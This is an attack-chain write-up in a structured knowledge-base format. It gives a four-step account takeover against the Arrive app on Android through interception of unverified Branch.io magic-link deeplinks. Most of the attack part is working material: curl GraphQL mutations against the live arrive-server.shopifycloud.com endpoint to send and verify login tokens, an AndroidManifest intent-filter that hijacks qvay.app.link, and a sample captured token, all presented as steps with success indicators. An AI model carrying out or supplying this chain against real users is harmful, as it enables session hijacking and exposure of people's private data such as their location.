---
id: ac-uuid-123
tags:
  - deeplink-interception
  - account-takeover
  - android
  - graphql
  - branch-io
  - magic-link
type: attack_chain
tools:
  - '[[tools/Android-SDK]]'
  - '[[tools/Branch-io]]'
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
verified: false
platforms:
  - Android
  - Mobile
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Request-Verification-Email-via-GraphQL]]'
  - '[[procedures/Configure-Malicious-App-for-Deeplink-Interception]]'
  - '[[procedures/Intercept-and-Extract-Token-from-Magic-Link]]'
  - '[[procedures/Verify-Token-to-Obtain-Session-Cookie]]'
step_count: 4
techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Valid Accounts]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:33:12.324Z'
description: >-
  Multi-stage attack exploiting unverified Branch.io deeplinks in the Arrive
  app's magic link login to intercept tokens and achieve account takeover on
  Android devices.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Hijack Execution Flow]]'
  - '[[Valid Accounts]]'
  - '[[Adversary-in-the-Middle]]'
---
# Android Deeplink Interception for Arrive App Account Takeover via Magic Link

Multi-stage attack chain demonstrating exploitation of unverified App Links in the Arrive app's magic link login process, allowing a malicious Android app to intercept deeplinks, extract login tokens, and achieve full account takeover with access to private user data like location.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Request Verification Email] --> B[Configure Malicious App]
    B --> C[Intercept Magic Link]
    C --> D[Extract and Verify Token]
    D --> E[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Android-SDK]]
- [[tools/Branch-io]]

### Target Environment

- Android OS/Platform
- Services: arrive-server.shopifycloud.com (GraphQL endpoint)
- Network access: Internet connectivity for email and API requests

### Initial Access Requirements

- Target user's email address
- Ability to install a malicious APK on the device (e.g., via sideloading or social engineering)
- Access to device email client to open the magic link

## Detailed Attack Procedures

### Step 1: Request Verification Email
procedure: [[procedures/Request-Verification-Email-via-GraphQL]]

**Objective**: Initiate the magic link login process by triggering an email with the deeplink containing the login token.

**Instructions**: Use the GraphQL mutation to send a verification email to the target user's address. This can be done proactively if the malicious app has access to device email accounts via Android SDK.

Execute [[commands/send-verification-email-graphql]]:

```bash
curl -X POST https://arrive-server.shopifycloud.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"operationName":"SendVerificationEmail","variables":{"email":"target@example.com"},"query":"mutation SendVerificationEmail($email: String!) { sendVerificationEmail(email: $email) { userErrors { field message __typename } __typename } }"}'
```

**Expected Output**: JSON response confirming the email was sent, possibly with an initial session cookie.

**Success Indicators**:
- Response contains no userErrors
- Email received in target inbox with magic link to https://qvay.app.link/...

### Step 2: Configure Malicious App for Deeplink Interception
procedure: [[procedures/Configure-Malicious-App-for-Deeplink-Interception]]

**Objective**: Set up the malicious Android app to capture intents for the unverified Branch.io domain.

**Instructions**: Add an intent-filter to the app's AndroidManifest.xml to hijack deeplinks. Build and install the APK using Android SDK.

Configure [[commands/android-intent-filter-xml]] in AndroidManifest.xml:

```xml
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <category android:name="android.intent.category.BROWSABLE" />
  <data android:scheme="https" />
  <data android:host="qvay.app.link" />
</intent-filter>
```

Build and install the APK on the target device.

**Expected Output**: App registers successfully and receives intents for matching deeplinks.

**Success Indicators**:
- APK installs without errors
- App launches and logs intent reception when deeplink is opened

### Step 3: Intercept and Extract Token from Magic Link
procedure: [[procedures/Intercept-and-Extract-Token-from-Magic-Link]]

**Objective**: Capture the magic link when opened from email and parse the token from URL parameters.

**Instructions**: Open the email on the device; the malicious app intercepts the intent. In the app code, parse the URI to extract the token parameter.

Upon interception, use Android Intent handling to get the data URI and extract parameters like token (e.g., FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa).

**Expected Output**: Token value extracted and logged or stored.

**Success Indicators**:
- Intent received in malicious app
- Token parameter successfully parsed from deeplink URL

### Step 4: Verify Token to Obtain Session Cookie
procedure: [[procedures/Verify-Token-to-Obtain-Session-Cookie]]

**Objective**: Exchange the intercepted token for a valid session cookie to access the user's account.

**Instructions**: Send the GraphQL mutation with the extracted token to verify and receive the session cookie.

Execute [[commands/verify-token-graphql]]:

```bash
curl -X POST https://arrive-server.shopifycloud.com/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: _arrive-server_session=existing_if_any" \
  -d '{"operationName":"VerifyToken","variables":{"token":"extracted_token_here"},"query":"mutation VerifyToken($token: String!) { verifyToken(token: $token) { user { id __typename } userErrors { field message __typename } __typename } }"}'
```

**Expected Output**: JSON response with user details and Set-Cookie header containing _arrive-server_session for authenticated access.

**Success Indicators**:
- No userErrors in response
- Valid session cookie received
- Access to private data (e.g., user location) via subsequent API calls

## Attack Chain Summary

### Key Achievements

1. Intercepted unverified magic link deeplink without App Links validation
2. Extracted login token leading to session hijacking
3. Achieved full account takeover with access to sensitive user data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Hijack Execution Flow]] Hijack Execution Flow (Android intent interception)
- [[Valid Accounts]] Valid Accounts (token-based session access)
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle (deeplink interception)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Lateral Movement]] Lateral Movement

---

*Last updated: 2024-10-01T00:00:00Z*
